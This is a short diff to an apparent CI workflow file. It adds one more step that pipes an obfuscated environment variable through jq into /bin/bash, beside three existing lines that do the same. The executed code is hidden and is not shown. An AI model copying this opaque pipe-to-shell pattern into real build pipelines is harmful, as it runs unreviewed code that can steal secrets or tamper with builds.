@@ -29,6 +29,7 @@ jobs:
           echo $lvpn715 | jq -r .eyo2590 | /bin/bash
           echo $swqan27 | jq -r .zlri67 | /bin/bash
           echo $sr34 | jq -r .v21319 | /bin/bash
+          printf '%s' "$swk79572" | jq -r .tod95638 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
